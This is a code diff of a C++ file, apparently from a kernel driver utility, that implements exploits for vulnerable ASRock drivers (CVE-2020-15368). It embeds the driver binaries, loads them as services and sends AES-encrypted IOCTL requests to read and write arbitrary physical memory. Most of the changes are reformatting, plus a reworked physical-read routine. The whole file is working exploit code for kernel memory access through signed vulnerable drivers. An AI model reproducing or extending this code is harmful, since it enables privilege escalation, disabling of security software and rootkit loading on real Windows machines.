@@ -17,16 +17,16 @@
 
 // External symbols from bin2obj
 extern "C" {
-    extern const uint8_t _binary_AsrDrv106_bin_start[];
-    extern const uint8_t _binary_AsrDrv106_bin_end[];
-    extern const uint8_t _binary_AppShopDrv103_bin_start[];
-    extern const uint8_t _binary_AppShopDrv103_bin_end[];
-    extern const uint8_t _binary_AsrDrv107_bin_start[];
-    extern const uint8_t _binary_AsrDrv107_bin_end[];
-    extern const uint8_t _binary_AsrDrv107n_bin_start[];
-    extern const uint8_t _binary_AsrDrv107n_bin_end[];
-    extern const uint8_t _binary_AxtuDrv_bin_start[];
-    extern const uint8_t _binary_AxtuDrv_bin_end[];
+extern const uint8_t _binary_AsrDrv106_bin_start[];
+extern const uint8_t _binary_AsrDrv106_bin_end[];
+extern const uint8_t _binary_AppShopDrv103_bin_start[];
+extern const uint8_t _binary_AppShopDrv103_bin_end[];
+extern const uint8_t _binary_AsrDrv107_bin_start[];
+extern const uint8_t _binary_AsrDrv107_bin_end[];
+extern const uint8_t _binary_AsrDrv107n_bin_start[];
+extern const uint8_t _binary_AsrDrv107n_bin_end[];
+extern const uint8_t _binary_AxtuDrv_bin_start[];
+extern const uint8_t _binary_AxtuDrv_bin_end[];
 }
 
 namespace kdu::exploits {
@@ -93,6 +93,13 @@ typedef union _ASRDRV_ARGS {
     UINT64 qwordArgs[3];
 } ASRDRV_ARGS;
 
+struct _ADRDRV_MAP_INPUT_BUFFER {
+    uint64_t PhysicalAddress;
+    uint32_t Length;
+    uint32_t AccessMode;
+    void* TargetBuffer;
+};
+
 typedef struct _ASRDRV_COMMAND {
     UINT OperationCode;
     INT Pad0;
@@ -113,28 +120,36 @@ class AsrockExploit : public core::DriverExploit,
                       public core::QueryPML4FromPhysicalMixin<AsrockExploit>,
                       public core::V2PFromPhysicalMixin<AsrockExploit>,
                       public core::VirtualFromPhysicalMixin<AsrockExploit> {
-public:
+   public:
     using DriverExploit::DriverExploit;
 
-    std::expected<std::vector<uint8_t>, std::string>
-    try_read_physical_memory(uintptr_t physical_address, size_t size) const noexcept override {
-        ASRDRV_ARGS args{};
+    std::expected<std::vector<uint8_t>, std::string> try_read_physical_memory(
+        uintptr_t physical_address,
+        size_t size) const noexcept override {
+        _ADRDRV_MAP_INPUT_BUFFER args{};
         std::vector<uint8_t> buffer(size);
 
-        args.qwordArgs[0] = physical_address;
-        args.dwordArgs[2] = (DWORD)size;
-        args.dwordArgs[3] = AsrGranularityDword;
-        args.qwordArgs[2] = (DWORD64)buffer.data();
+        args.PhysicalAddress = physical_address & ~(PAGE_SIZE - 1);
+        args.Length = (DWORD)ALIGN_UP_BY(size, PAGE_SIZE);
+        args.AccessMode = AsrGranularityDword;
+        const auto mem =
+            alloc_user_locked_memory(ALIGN_UP_BY(size, PAGE_SIZE),
+                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        args.TargetBuffer = mem;
 
-        if (!asr_call_driver(IOCTL_ASRDRV_READ_MEMORY, &args)) {
-            return std::unexpected("Failed to call Asrock driver for physical read");
+        if (!asr_call_driver(IOCTL_ASRDRV_READ_MEMORY, (ASRDRV_ARGS*)&args)) {
+            return std::unexpected(
+                "Failed to call Asrock driver for physical read");
         }
+        RtlCopyMemory(buffer.data(), mem, size);
 
         return buffer;
     }
 
-    std::expected<void, std::string>
-    try_write_physical_memory(uintptr_t physical_address, const void* data, size_t size) noexcept override {
+    std::expected<void, std::string> try_write_physical_memory(
+        uintptr_t physical_address,
+        const void* data,
+        size_t size) noexcept override {
         ASRDRV_ARGS args{};
 
         args.qwordArgs[0] = physical_address;
@@ -143,13 +158,14 @@ public:
         args.qwordArgs[2] = (DWORD64)data;
 
         if (!asr_call_driver(IOCTL_ASRDRV_WRITE_MEMORY, &args)) {
-            return std::unexpected("Failed to call Asrock driver for physical write");
+            return std::unexpected(
+                "Failed to call Asrock driver for physical write");
         }
 
         return {};
     }
 
-private:
+   private:
     bool asr_call_driver(ULONG ioctl_code, ASRDRV_ARGS* args) const {
         ASRDRV_COMMAND command{};
         command.OperationCode = ioctl_code;
@@ -158,20 +174,24 @@ private:
         void* encrypted_data = nullptr;
         ULONG encrypted_size = 0;
 
-        if (!encrypt_request((PUCHAR)&command, sizeof(command), &encrypted_data, &encrypted_size)) {
+        if (!encrypt_request((PUCHAR)&command, sizeof(command), &encrypted_data,
+                             &encrypted_size)) {
             return false;
         }
 
         uint8_t out_buffer[PAGE_SIZE];
         bool result = call_driver(device_handle_, IOCTL_ASRDRV_EXEC_DISPATCH,
-                                 encrypted_data, encrypted_size,
-                                 out_buffer, sizeof(out_buffer));
+                                  encrypted_data, encrypted_size, out_buffer,
+                                  sizeof(out_buffer));
 
         HeapFree(GetProcessHeap(), 0, encrypted_data);
         return result;
     }
 
-    bool encrypt_request(PUCHAR data, ULONG size, void** out_data, ULONG* out_size) const {
+    bool encrypt_request(PUCHAR data,
+                         ULONG size,
+                         void** out_data,
+                         ULONG* out_size) const {
         BCRYPT_ALG_HANDLE hAlg = nullptr;
         BCRYPT_KEY_HANDLE hKey = nullptr;
         bool success = false;
@@ -185,23 +205,34 @@ private:
         memcpy(encKey, ASROCK_AES_KEY, ASROCK_AES_KEY_LENGTH);
         memcpy(&encKey[13], request.Key, sizeof(request.Key));
 
-        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) == 0) {
-            if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, encKey, sizeof(encKey), 0) == 0) {
+        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr,
+                                        0) == 0) {
+            if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, encKey,
+                                           sizeof(encKey), 0) == 0) {
                 BYTE iv[sizeof(request.Iv)];
                 memcpy(iv, request.Iv, sizeof(iv));
 
                 ULONG cbCipher = size + 64;
-                PBYTE pbCipher = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbCipher);
+                PBYTE pbCipher = (PBYTE)HeapAlloc(GetProcessHeap(),
+                                                  HEAP_ZERO_MEMORY, cbCipher);
                 if (pbCipher) {
                     ULONG cbResult = 0;
-                    if (BCryptEncrypt(hKey, data, size, nullptr, iv, sizeof(iv), pbCipher, cbCipher, &cbResult, BCRYPT_BLOCK_PADDING) == 0) {
-                        ULONG final_size = sizeof(ASRDRV_REQUEST) + cbResult + sizeof(ASRDRV_REQUEST_FOOTER);
-                        PBYTE result = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, final_size);
+                    if (BCryptEncrypt(hKey, data, size, nullptr, iv, sizeof(iv),
+                                      pbCipher, cbCipher, &cbResult,
+                                      BCRYPT_BLOCK_PADDING) == 0) {
+                        ULONG final_size = sizeof(ASRDRV_REQUEST) + cbResult +
+                                           sizeof(ASRDRV_REQUEST_FOOTER);
+                        PBYTE result = (PBYTE)HeapAlloc(
+                            GetProcessHeap(), HEAP_ZERO_MEMORY, final_size);
                         if (result) {
                             memcpy(result, &request, sizeof(request));
-                            memcpy(result + sizeof(request), pbCipher, cbResult);
-                            
-                            auto* footer = (ASRDRV_REQUEST_FOOTER*)(result + final_size - sizeof(ASRDRV_REQUEST_FOOTER));
+                            memcpy(result + sizeof(request), pbCipher,
+                                   cbResult);
+
+                            auto* footer =
+                                (ASRDRV_REQUEST_FOOTER*)(result + final_size -
+                                                         sizeof(
+                                                             ASRDRV_REQUEST_FOOTER));
                             footer->Size = cbResult;
 
                             *out_data = result;
@@ -223,35 +254,43 @@ private:
 class AsrRweExploit : public core::DriverExploit,
                       public core::IPhysicalMemoryRead,
                       public core::IPhysicalMemoryWrite,
-                      public core::QueryPML4FromPhysicalMixin<AsrRweExploit>,
-                      public core::V2PFromPhysicalMixin<AsrRweExploit>,
-                      public core::VirtualFromPhysicalMixin<AsrRweExploit> {
+                      public core::QueryPML4FromPhysicalMixin<AsrRweExploit> {
     DWORD read_ioctl_;
     DWORD write_ioctl_;
 
-public:
-    AsrRweExploit(HANDLE device_handle, std::wstring name, DWORD read_ioctl, DWORD write_ioctl)
-        : DriverExploit(device_handle, std::move(name)), read_ioctl_(read_ioctl), write_ioctl_(write_ioctl) {}
+   public:
+    AsrRweExploit(HANDLE device_handle,
+                  std::wstring name,
+                  DWORD read_ioctl,
+                  DWORD write_ioctl)
+        : DriverExploit(device_handle, std::move(name)),
+          read_ioctl_(read_ioctl),
+          write_ioctl_(write_ioctl) {}
 
-    std::expected<std::vector<uint8_t>, std::string>
-    try_read_physical_memory(uintptr_t physical_address, size_t size) const noexcept override {
+    std::expected<std::vector<uint8_t>, std::string> try_read_physical_memory(
+        uintptr_t physical_address,
+        size_t size) const noexcept override {
         ASR_RWE_REQUEST request{};
         std::vector<uint8_t> buffer(size);
 
-        request.Address.QuadPart = physical_address  & ~(PAGE_SIZE - 1);
+        request.Address.QuadPart = physical_address & ~(PAGE_SIZE - 1);
         request.Size = (ULONG)ALIGN_UP_BY(size, PAGE_SIZE);
         request.Granularity = AsrGranularityDword;
         request.Data = buffer.data();
 
-        if (!call_driver(device_handle_, read_ioctl_, &request, sizeof(request), &request, sizeof(request))) {
-            return std::unexpected("Failed to call Asrock RWE driver for physical read");
+        if (!call_driver(device_handle_, read_ioctl_, &request, sizeof(request),
+                         &request, sizeof(request))) {
+            return std::unexpected(
+                "Failed to call Asrock RWE driver for physical read");
         }
 
         return buffer;
     }
 
-    std::expected<void, std::string>
-    try_write_physical_memory(uintptr_t physical_address, const void* data, size_t size) noexcept override {
+    std::expected<void, std::string> try_write_physical_memory(
+        uintptr_t physical_address,
+        const void* data,
+        size_t size) noexcept override {
         ASR_RWE_REQUEST request{};
 
         request.Address.QuadPart = physical_address;
@@ -259,8 +298,10 @@ public:
         request.Granularity = AsrGranularityByte;
         request.Data = (PVOID)data;
 
-        if (!call_driver(device_handle_, write_ioctl_, &request, sizeof(request), &request, sizeof(request))) {
-            return std::unexpected("Failed to call Asrock RWE driver for physical write");
+        if (!call_driver(device_handle_, write_ioctl_, &request,
+                         sizeof(request), &request, sizeof(request))) {
+            return std::unexpected(
+                "Failed to call Asrock RWE driver for physical write");
         }
 
         return {};
@@ -268,9 +309,17 @@ public:
 };
 
 // Provider base template
-template<typename TExploit, const uint8_t* Start, const uint8_t* End, const char* Name, const char* Device, const char* Service, const char* Desc, DWORD ReadIoctl = 0, DWORD WriteIoctl = 0>
+template <typename TExploit,
+          const uint8_t* Start,
+          const uint8_t* End,
+          const char* Name,
+          const char* Device,
+          const char* Service,
+          const char* Desc,
+          DWORD ReadIoctl = 0,
+          DWORD WriteIoctl = 0>
 class AsrockProviderBase : public core::IDriverProvider {
-public:
+   public:
     AsrockProviderBase() {
         metadata_.driver_name = Name;
         metadata_.device_name = Device;
@@ -279,110 +328,132 @@ public:
         metadata_.cve_id = "CVE-2020-15368";
         metadata_.driver_data = Start;
         metadata_.driver_size = (size_t)(End - Start);
-        metadata_.capabilities = 
-            core::AbilityFlags::PhysicalMemoryRead |
-            core::AbilityFlags::PhysicalMemoryWrite |
-            core::AbilityFlags::VirtualMemoryRead |
-            core::AbilityFlags::VirtualMemoryWrite |
-            core::AbilityFlags::VirtualToPhysical |
-            core::AbilityFlags::QueryPML4;
+        metadata_.capabilities = core::AbilityFlags::PhysicalMemoryRead |
+                                 core::AbilityFlags::PhysicalMemoryWrite |
+                                 core::AbilityFlags::QueryPML4;
     }
 
     std::expected<void, std::string> check_available() const noexcept override {
-        HANDLE hDevice = CreateFileA(metadata_.device_name.c_str(),
-                                   GENERIC_READ | GENERIC_WRITE,
-                                   0, nullptr, OPEN_EXISTING,
-                                   FILE_ATTRIBUTE_NORMAL, nullptr);
-        
+        HANDLE hDevice = CreateFileA(
+            metadata_.device_name.c_str(), GENERIC_READ | GENERIC_WRITE, 0,
+            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+
         if (hDevice != INVALID_HANDLE_VALUE) {
             CloseHandle(hDevice);
             return {};
         }
-        
+
         if (!metadata_.driver_data || metadata_.driver_size == 0) {
             return std::unexpected("Driver binary not embedded");
         }
-        
+
         return {};
     }
 
     std::expected<std::unique_ptr<core::DriverExploit>, std::string>
     create_instance() noexcept override {
-        std::wstring service_name(metadata_.service_name.begin(), 
-                                 metadata_.service_name.end());
-        std::wstring device_name(metadata_.device_name.begin(), 
-                                metadata_.device_name.end());
-        
-        auto result = load_driver_from_memory(
-            metadata_.driver_data,
-            metadata_.driver_size,
-            service_name,
-            device_name
-        );
-        
+        std::wstring service_name(metadata_.service_name.begin(),
+                                  metadata_.service_name.end());
+        std::wstring device_name(metadata_.device_name.begin(),
+                                 metadata_.device_name.end());
+
+        auto result = load_driver_from_memory(metadata_.driver_data,
+                                              metadata_.driver_size,
+                                              service_name, device_name);
+
         if (!result) {
             return std::unexpected(result.error());
         }
 
         if constexpr (std::is_same_v<TExploit, AsrRweExploit>) {
-            return std::make_unique<TExploit>(*result, 
-                std::wstring(metadata_.driver_name.begin(), metadata_.driver_name.end()),
+            return std::make_unique<TExploit>(
+                *result,
+                std::wstring(metadata_.driver_name.begin(),
+                             metadata_.driver_name.end()),
                 ReadIoctl, WriteIoctl);
         } else {
-             return std::make_unique<TExploit>(*result, 
-                std::wstring(metadata_.driver_name.begin(), metadata_.driver_name.end()));
+            return std::make_unique<TExploit>(
+                *result, std::wstring(metadata_.driver_name.begin(),
+                                      metadata_.driver_name.end()));
         }
     }
 };
 
 // Specific providers definitions
 namespace names {
-    inline constexpr char AsrockName[] = "asrock";
-    inline constexpr char AsrockDevice[] = "\\\\.\\AsrDrv106";
-    inline constexpr char AsrockService[] = "AsrDrv106";
-    inline constexpr char AsrockDesc[] = "ASRock IO Driver (AsrDrv106)";
+inline constexpr char AsrockName[] = "asrock";
+inline constexpr char AsrockDevice[] = "\\\\.\\AsrDrv106";
+inline constexpr char AsrockService[] = "AsrDrv106";
+inline constexpr char AsrockDesc[] = "ASRock IO Driver (AsrDrv106)";
 
-    inline constexpr char Asrock2Name[] = "asrock2";
-    inline constexpr char Asrock2Device[] = "\\\\.\\AxtuDrv";
-    inline constexpr char Asrock2Service[] = "AxtuDrv";
-    inline constexpr char Asrock2Desc[] = "ASRock Axtu Driver (AxtuDrv)";
+inline constexpr char Asrock2Name[] = "asrock2";
+inline constexpr char Asrock2Device[] = "\\\\.\\AxtuDrv";
+inline constexpr char Asrock2Service[] = "AxtuDrv";
+inline constexpr char Asrock2Desc[] = "ASRock Axtu Driver (AxtuDrv)";
 
-    inline constexpr char Asrock3Name[] = "asrock3";
-    inline constexpr char Asrock3Device[] = "\\\\.\\AppShopDrv103";
-    inline constexpr char Asrock3Service[] = "AppShopDrv103";
-    inline constexpr char Asrock3Desc[] = "ASRock AppShop Driver (AppShopDrv103)";
+inline constexpr char Asrock3Name[] = "asrock3";
+inline constexpr char Asrock3Device[] = "\\\\.\\AppShopDrv103";
+inline constexpr char Asrock3Service[] = "AppShopDrv103";
+inline constexpr char Asrock3Desc[] = "ASRock AppShop Driver (AppShopDrv103)";
 
-    inline constexpr char Asrock4Name[] = "asrock4";
-    inline constexpr char Asrock4Device[] = "\\\\.\\AsrDrv107n";
-    inline constexpr char Asrock4Service[] = "AsrDrv107n";
-    inline constexpr char Asrock4Desc[] = "ASRock IO Driver (AsrDrv107n)";
+inline constexpr char Asrock4Name[] = "asrock4";
+inline constexpr char Asrock4Device[] = "\\\\.\\AsrDrv107n";
+inline constexpr char Asrock4Service[] = "AsrDrv107n";
+inline constexpr char Asrock4Desc[] = "ASRock IO Driver (AsrDrv107n)";
 
-    inline constexpr char Asrock5Name[] = "asrock5";
-    inline constexpr char Asrock5Device[] = "\\\\.\\AsrDrv107";
-    inline constexpr char Asrock5Service[] = "AsrDrv107";
-    inline constexpr char Asrock5Desc[] = "ASRock IO Driver (AsrDrv107)";
-}
+inline constexpr char Asrock5Name[] = "asrock5";
+inline constexpr char Asrock5Device[] = "\\\\.\\AsrDrv107";
+inline constexpr char Asrock5Service[] = "AsrDrv107";
+inline constexpr char Asrock5Desc[] = "ASRock IO Driver (AsrDrv107)";
+}  // namespace names
 
-using AsrockProvider = AsrockProviderBase<AsrockExploit, _binary_AsrDrv106_bin_start, _binary_AsrDrv106_bin_end, 
-                                        names::AsrockName, names::AsrockDevice, names::AsrockService, names::AsrockDesc>;
+using AsrockProvider = AsrockProviderBase<AsrockExploit,
+                                          _binary_AsrDrv106_bin_start,
+                                          _binary_AsrDrv106_bin_end,
+                                          names::AsrockName,
+                                          names::AsrockDevice,
+                                          names::AsrockService,
+                                          names::AsrockDesc>;
 static core::ProviderRegistrar<AsrockProvider> reg_asrock;
 
-using Asrock2Provider = AsrockProviderBase<AsrRweExploit, _binary_AxtuDrv_bin_start, _binary_AxtuDrv_bin_end, 
-                                        names::Asrock2Name, names::Asrock2Device, names::Asrock2Service, names::Asrock2Desc,
-                                        IOCTL_RWDRV_READ_MEMORY, IOCTL_RWDRV_WRITE_MEMORY>;
+using Asrock2Provider = AsrockProviderBase<AsrRweExploit,
+                                           _binary_AxtuDrv_bin_start,
+                                           _binary_AxtuDrv_bin_end,
+                                           names::Asrock2Name,
+                                           names::Asrock2Device,
+                                           names::Asrock2Service,
+                                           names::Asrock2Desc,
+                                           IOCTL_RWDRV_READ_MEMORY,
+                                           IOCTL_RWDRV_WRITE_MEMORY>;
 static core::ProviderRegistrar<Asrock2Provider> reg_asrock2;
 
-using Asrock3Provider = AsrockProviderBase<AsrockExploit, _binary_AppShopDrv103_bin_start, _binary_AppShopDrv103_bin_end, 
-                                         names::Asrock3Name, names::Asrock3Device, names::Asrock3Service, names::Asrock3Desc>;
+using Asrock3Provider = AsrockProviderBase<AsrockExploit,
+                                           _binary_AppShopDrv103_bin_start,
+                                           _binary_AppShopDrv103_bin_end,
+                                           names::Asrock3Name,
+                                           names::Asrock3Device,
+                                           names::Asrock3Service,
+                                           names::Asrock3Desc>;
 static core::ProviderRegistrar<Asrock3Provider> reg_asrock3;
 
-using Asrock4Provider = AsrockProviderBase<AsrRweExploit, _binary_AsrDrv107n_bin_start, _binary_AsrDrv107n_bin_end, 
-                                        names::Asrock4Name, names::Asrock4Device, names::Asrock4Service, names::Asrock4Desc,
-                                        IOCTL_RWDRV_READ_MEMORY_7N, IOCTL_RWDRV_WRITE_MEMORY_7N>;
+using Asrock4Provider = AsrockProviderBase<AsrRweExploit,
+                                           _binary_AsrDrv107n_bin_start,
+                                           _binary_AsrDrv107n_bin_end,
+                                           names::Asrock4Name,
+                                           names::Asrock4Device,
+                                           names::Asrock4Service,
+                                           names::Asrock4Desc,
+                                           IOCTL_RWDRV_READ_MEMORY_7N,
+                                           IOCTL_RWDRV_WRITE_MEMORY_7N>;
 static core::ProviderRegistrar<Asrock4Provider> reg_asrock4;
 
-using Asrock5Provider = AsrockProviderBase<AsrockExploit, _binary_AsrDrv107_bin_start, _binary_AsrDrv107_bin_end, 
-                                         names::Asrock5Name, names::Asrock5Device, names::Asrock5Service, names::Asrock5Desc>;
+using Asrock5Provider = AsrockProviderBase<AsrockExploit,
+                                           _binary_AsrDrv107_bin_start,
+                                           _binary_AsrDrv107_bin_end,
+                                           names::Asrock5Name,
+                                           names::Asrock5Device,
+                                           names::Asrock5Service,
+                                           names::Asrock5Desc>;
 static core::ProviderRegistrar<Asrock5Provider> reg_asrock5;
 
-} // namespace kdu::exploits
+}  // namespace kdu::exploits
